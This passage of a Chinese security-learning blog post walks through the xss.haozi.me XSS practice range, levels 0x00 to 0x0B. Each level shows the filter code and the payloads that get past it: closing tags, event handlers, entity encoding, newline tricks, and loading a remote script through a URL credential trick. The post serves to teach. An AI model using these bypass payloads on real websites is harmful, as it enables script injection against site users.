27%3B%26%23x78%3B%26%23x73%3B%26%23x73%3B%26%23x27%3B%26%23x29%3B</span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354354586.png"></p>
<h3 id="场景二-弹窗问题"><a href="#场景二-弹窗问题" class="headerlink" title="场景二 弹窗问题"></a>场景二 弹窗问题</h3><p><code>&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&lt;/script&gt; </code>和</p>
<p><code>&lt;svg&gt;&lt;script&gt;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x27;&amp;#x29;&lt;/script&gt;</code> </p>
<p>** 直接放进html文件里面，觉得哪个可以弹窗，为什么另一个不能弹窗？**</p>
<p>答：<strong>后者</strong>可以弹窗。</p>
<p><strong>payload1解析情况</strong></p>
<p><img src="/./images/20250621_1354353777.png"></p>
<p><strong>payload2解析情况</strong></p>
<p><img src="/./images/20250621_1354352363.png"></p>
<p><img src="/./images/20250621_1354353722.png"></p>
<p><strong>总结：</strong>直接如果是script，html解析器就直接调用的js解析器，没有用到html的解析器。外面没有其他标签了。</p>
<h1 id="常见疑难点"><a href="#常见疑难点" class="headerlink" title="常见疑难点"></a>常见疑难点</h1><h2 id="实体化编码后为什么可以防注入？"><a href="#实体化编码后为什么可以防注入？" class="headerlink" title="实体化编码后为什么可以防注入？"></a>实体化编码后为什么可以防注入？</h2><p><font style="color:rgba(0, 0, 0, 0.85);">在 HTML 中，特殊字符具有特定功能，比如 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 用于开始标签，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 用于结束标签 ，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 用于表示 HTML 实体的开始。当浏览器解析 HTML 文档时，会将这些特殊字符识别为 HTML 结构的一部分。而实体编码是将这些特殊字符转换为对应的 HTML 实体，例如 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 转换为 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;lt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 转换为 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 转换为 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&amp;amp;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 。这样一来，浏览器会把这些</font><strong><font style="color:rgba(0, 0, 0, 0.85);">实体当作普通文本显示</font></strong><font style="color:rgba(0, 0, 0, 0.85);">，</font><strong><font style="color:rgba(0, 0, 0, 0.85);">而不是解析为 HTML 代码</font></strong><font style="color:rgba(0, 0, 0, 0.85);">，从而阻止攻击者利用特殊字符构建恶意标签或执行恶意脚本。</font></p>
<h2 id="为什么有时候又要通过实体化编码去绕过检测？"><a href="#为什么有时候又要通过实体化编码去绕过检测？" class="headerlink" title="为什么有时候又要通过实体化编码去绕过检测？"></a><font style="color:rgba(0, 0, 0, 0.85);">为什么有时候又要通过实体化编码去绕过检测？</font></h2><p><font style="color:rgba(0, 0, 0, 0.85);">如果输入的就是实体编码，比如</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;img src=1 onerror=&#39;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&#39;&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">，为什么浏览器解析后为什么还会当作js代码执行并成功弹窗？</font></p>
<p><font style="color:rgba(0, 0, 0, 0.85);"></font></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">实体编码的目的是在正常文本中表示特殊字符，而不是用于防范这种已经是编码形式的恶意代码。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">在这种情况下，实体编码被攻击者利用来隐藏恶意脚本的真实意图，浏览器会按照正常的解析流程将其还原并执行。要防范此类攻击，不能仅依赖实体编码，还需要结合其他安全措施，如对输入进行严格的验证和过滤，限制</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;onerror&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);">等事件属性的使用，实施内容安全策略等。</font></p>
<h1 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句"></a>常用语句</h1><h1 id="XSS-haozi-靶场"><a href="#XSS-haozi-靶场" class="headerlink" title="XSS-haozi-靶场"></a>XSS-haozi-靶场</h1><p><a target="_blank" rel="noopener" href="https://xss.haozi.me/#/0x00">https://xss.haozi.me/</a></p>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00 "></a>0x00 <div></div></h2><script>alert(1)</script>

<p><img src="/./images/20250621_1354361714.png"></p>
<h2 id="0X01"><a href="#0X01" class="headerlink" title="0X01"></a>0X01</h2><h3 id="Server-Code"><a href="#Server-Code" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &#x27;<span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&#x27; + input + &#x27;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;&lt;textarea&gt;&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 标签是 HTML 里用于创建多行文本输入框的元素，用户能在这个框里输入和编辑多行文本。</font></p>
<p><font style="color:rgba(0, 0, 0, 0.85);">所以这里考虑将拼接前方的<textarea>先闭合，将</textarea></font><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>逃出</p>
<h3 id="Payload-逃逸"><a href="#Payload-逃逸" class="headerlink" title="Payload 逃逸"></a>Payload 逃逸<textarea></textarea></h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354361473.png"></p>
<h3 id="0x00和0x01对比分析"><a href="#0x00和0x01对比分析" class="headerlink" title="0x00和0x01对比分析"></a>0x00和0x01对比分析</h3><p><code>&lt;textarea&gt;</code> 元素的设计目的是用于输入和显示纯文本内容。当你在 <code>&lt;textarea&gt;</code> 中输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，浏览器会将其视为<strong>普通的文本字符串</strong>，而不是 HTML 代码。因此，其中的 <code>&lt;script&gt;</code> 标签不会被解析和执行，也就不会触发 XSS 攻击。</p>
<p><code>&lt;div&gt;</code> 元素用于包含和渲染 HTML 内容。当你在 <code>&lt;div&gt;</code> 中插入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 时，浏览器<strong>会将其解析为 HTML 代码</strong>，并执行其中的 <code>&lt;script&gt;</code> 标签，从而触发 XSS 攻击。</p>
<h2 id="0x02-闭合、onmouseover"><a href="#0x02-闭合、onmouseover" class="headerlink" title="0x02 闭合、onmouseover"></a>0x02 闭合<input>、onmouseover</h2><h3 id="Server-Code-1"><a href="#Server-Code-1" class="headerlink" title="Server Code"></a>Server Code</h3><p>情况类似，也是通过标签闭合，然后逃逸出即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  return &#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&#x27; + input + &#x27;&quot;</span>&gt;</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354364631.png"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover = &quot;alert(1);</span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354373155.png"></p>
<h2 id="0x03-过滤"><a href="#0x03-过滤" class="headerlink" title="0x03 过滤()"></a>0x03 过滤()</h2><h3 id="Server-Code-2"><a href="#Server-Code-2" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &#x27;&#x27;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span> =<span class="string">&quot;alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="0x04-过滤"><a href="#0x04-过滤" class="headerlink" title="0x04 过滤( )&#96;"></a>0x04 过滤( )&#96;</h2><h3 id="Server-Code-3"><a href="#Server-Code-3" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripBracketsRe = /[()`]/g</span><br><span class="line">  input = input.replace(stripBracketsRe, &#x27;&#x27;)</span><br><span class="line">  return input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">&#x27;alert\x281\x29&#x27;</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span> =<span class="string">&quot;alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span>;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x05-注释符"><a href="#0x05-注释符" class="headerlink" title="0x05 注释符"></a>0x05 注释符</h2><h3 id="Server-Code-4"><a href="#Server-Code-4" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, &#x27;😂&#x27;)</span><br><span class="line">  return &#x27;<span class="comment">&lt;!-- &#x27; + input + &#x27; --&gt;</span>&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>--&gt;</code>替换为😂，并且用注释符干扰。</p>
<p>注释符两种闭合手段</p>
<ol>
<li>–&gt;</li>
<li>–!&gt;</li>
</ol>
<h3 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;alert(&quot;hello world!&quot;)&lt;/scri<span class="comment">&lt;!--test--&gt;</span>pt&gt;</span><br></pre></td></tr></table></figure>

<h2 id="0x06-过滤on"><a href="#0x06-过滤on" class="headerlink" title="0x06 过滤on****&#x3D;"></a>0x06 过滤on****&#x3D;</h2><h3 id="Server-Code-5"><a href="#Server-Code-5" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/auto|on.*=|&gt;/ig, &#x27;_&#x27;)</span><br><span class="line">  return `<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">1</span> $&#123;<span class="attr">input</span>&#125; <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span>`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>onxxxx=</code>这样的字符串替换为<code>_</code></p>
<p>在<input>标签中 value一般是与onmouseover、onerror这类结合使用， 但没有匹配<strong>换行符</strong>, 可以通过换行来绕过匹配:  </p>
<h3 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type=&quot;image&quot; src=&quot;&quot; onerror</span><br><span class="line">=alert(1)</span><br></pre></td></tr></table></figure>

<p><code>&lt;input value=1 type=&quot;image&quot; src=&quot;&quot; onerror =alert(1) type=&quot;text&quot;&gt;</code><font style="color:rgb(0, 0, 0);"> 能触发 XSS 的原因</font></p>
<ul>
<li><code>**type=&quot;image&quot;**</code>：当 <code>&lt;input&gt;</code> 标签的 <code>type</code> 属性设置为 <code>image</code> 时，该输入框会被渲染成一个图像提交按钮。它需要通过 <code>src</code> 属性指定一个图像的 URL 来显示图像。</li>
<li><code>**onerror**</code>** **<strong>事件</strong>：<code>onerror</code> 是一个事件处理属性，用于在加载资源（如图片）失败时触发相应的 JavaScript 代码。在这个例子中，<code>src</code> 属性的值为空字符串，这意味着浏览器在尝试加载图片时会失败，从而触发 <code>onerror</code> 事件。</li>
<li><strong>触发 XSS</strong>：当 <code>onerror</code> 事件触发时，浏览器会执行 <code>alert(1)</code> 代码，弹出一个包含数字 <code>1</code> 的警告框，从而实现了 XSS 攻击。</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmouseover</span><br><span class="line">=&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354376480.png"></p>
<h2 id="0x07-过滤所有-HTML标签"><a href="#0x07-过滤所有-HTML标签" class="headerlink" title="0x07 过滤所有 HTML标签"></a>0x07 过滤所有 HTML标签</h2><h3 id="Server-Code-6"><a href="#Server-Code-6" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe = /&lt;\/?[^&gt;]+&gt;/gi</span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, &#x27;&#x27;)</span><br><span class="line">  return `<span class="tag">&lt;<span class="name">article</span>&gt;</span>$&#123;input&#125;<span class="tag">&lt;/<span class="name">article</span>&gt;</span>`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤<code>&lt;</code>和<code>&gt;</code>，以及其内部包裹的内容。也就是<strong>匹配输入字符串中的所有 HTML 标签。</strong></p>
<p><strong>这里就要尝试用不需要完整html的方式</strong></p>
<h3 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h3><p> <code>onerror</code>事件处理<strong>并不需要依附于任何实际的HTML标签</strong>来进行触发，所以第一个我们尝试访问加载图像，没有则事件触发，从而完成弹窗。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span></span></span><br></pre></td></tr></table></figure>

<h2 id="0x08-过滤指定标签"><a href="#0x08-过滤指定标签" class="headerlink" title="0x08 过滤指定标签"></a>0x08 过滤指定标签</h2><h3 id="Server-Code-7"><a href="#Server-Code-7" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src = src.replace(/&lt;\/style&gt;/ig, &#x27;/* \u574F\u4EBA */&#x27;)</span><br><span class="line">  return `</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h3><p>加一个空格即可<code>&lt;/style&gt;</code>变<code>&lt;/style &gt;</code></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/style &gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="0x09-HTTPS闭合"><a href="#0x09-HTTPS闭合" class="headerlink" title="0x09 HTTPS闭合"></a>0x09 HTTPS闭合</h2><h3 id="Server-Code-8"><a href="#Server-Code-8" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  let domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  if (domainRe.test(input)) &#123;</span><br><span class="line">    return `<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;$&#123;input&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br><span class="line">  &#125;</span><br><span class="line">  return &#x27;Invalid URL&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h3><script src="https://www.segmentfault.com" onerror="alert(1)"></script>

<p>无反应，因为没有让其报错，修改里面http链接，加入任意符号即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.segmentfault.com@&quot;</span><span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./images/20250621_1354374512.png"></p>
<h2 id="0x0A-HTTPS闭合-HTML实体"><a href="#0x0A-HTTPS闭合-HTML实体" class="headerlink" title="0x0A HTTPS闭合+HTML实体"></a>0x0A HTTPS闭合+HTML实体</h2><h3 id="Server-Code-9"><a href="#Server-Code-9" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  function escapeHtml(s) &#123;</span><br><span class="line">    return s.replace(/&amp;/g, &#x27;<span class="symbol">&amp;amp;</span>&#x27;)</span><br><span class="line">            .replace(/&#x27;/g, &#x27;<span class="symbol">&amp;#39;</span>&#x27;)</span><br><span class="line">            .replace(/&quot;/g, &#x27;<span class="symbol">&amp;quot;</span>&#x27;)</span><br><span class="line">            .replace(/&lt;/g, &#x27;<span class="symbol">&amp;lt;</span>&#x27;)</span><br><span class="line">            .replace(/&gt;/g, &#x27;<span class="symbol">&amp;gt;</span>&#x27;)</span><br><span class="line">            .replace(/\//g, &#x27;&amp;#x2f&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  const domainRe = /^https?:\/\/www\.segmentfault\.com/</span><br><span class="line">  if (domainRe.test(input)) &#123;</span><br><span class="line">    return `<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;$&#123;escapeHtml(input)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`</span><br><span class="line">  &#125;</span><br><span class="line">  return &#x27;Invalid URL&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h3><p><img src="/./images/20250621_1354374055.png"></p>
<p>按照上一关payload不行，这里对符号转义为了HTML实体。</p>
<p>想办法闭合<code>src</code>。但是行不通</p>
<p>搜索后学到：</p>
<p>此题可以使用http协议的基础概念，url前面可以添加身份验证信息，如：<a target="_blank" rel="noopener" href="https://user:pass@www.segmentfault.com/">https://user:pass@www.segmentfault.com</a>（现在用得很少，不安全）</p>
<p>又因为必须以固定的url开头，所以我们把<a target="_blank" rel="noopener" href="http://www.segmentfault.com当作身份认证信息,后面再去请求其他域名,如外部js或自己写一个放在服务器上/">www.segmentfault.com当作身份认证信息，后面再去请求其他域名，如外部js或自己写一个放在服务器上</a></p>
<p> 原理：实际上访问的网址是后面的xss.haozi.me&#x2F;j.js，前面的<a target="_blank" rel="noopener" href="http://www.segmentfault.com是作为一个身份验证信息传给了xss.haozi.me/j.js">www.segmentfault.com是作为一个身份验证信息传给了xss.haozi.me/j.js</a>  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.segmentfault.com@xss.haozi.me/j.js </span><br></pre></td></tr></table></figure>

<h2 id="0x0B-转换大写"><a href="#0x0B-转换大写" class="headerlink" title="0x0B  转换大写"></a>0x0B  转换大写</h2><h3 id="Server-Code-10"><a href="#Server-Code-10" class="headerlink" title="Server Code"></a>Server Code</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  return `<span class="tag">&lt;<span class="name">h1</span>&gt;</span>$&#123;input&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将输入转化为大写，之后添加</p><h1>标签<p></p>
<ol>
<li><strong>HTML不区分大小写</strong> 2. <strong>Javascript严格区分大小写</strong></li>
</ol>
<p><strong>方法一：</strong>在<code>&lt;font style=&quot;background-color:rgb(248, 248, 248);&quot;&gt;&lt;script&gt;&lt;/font&gt;</code>标签中的src添加，payload：<code>&lt;font style=&quot;background-color:rgb(248, 248, 248);&quot;&gt;&lt;script src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt;&lt;/font&gt;</code></p>
<p><img src="/./images/20250621_1354382224.png"></p>
<p>这种方式是通过 <code>src</code> 属性引用外部的 JavaScript 文件。恶意代码存放在远程服务器上，当页面加载时会从指定的 URL 下载并执行该文件中的代码。这样做的好处是可以在不修改页面代码的情况下，随时更新恶意代码，并且可以在多个页面中复用同一个恶意脚本文件。</p>
<p><strong>方法二：</strong>将js的代码通过html实体编码绕过<code>&lt;font style=&quot;background-color:rgb(248, 248, 248);&quot;&gt;&lt;img src=# onerror=alert(1)&gt;&lt;/font&gt;</code> 即下面转码后的结果<br><code>&lt;img src=# onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></p>
<p><img src="/./images/20250621_1354384439.png"></p>
<h3 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span></span><br></pre></td></tr></table></figure>



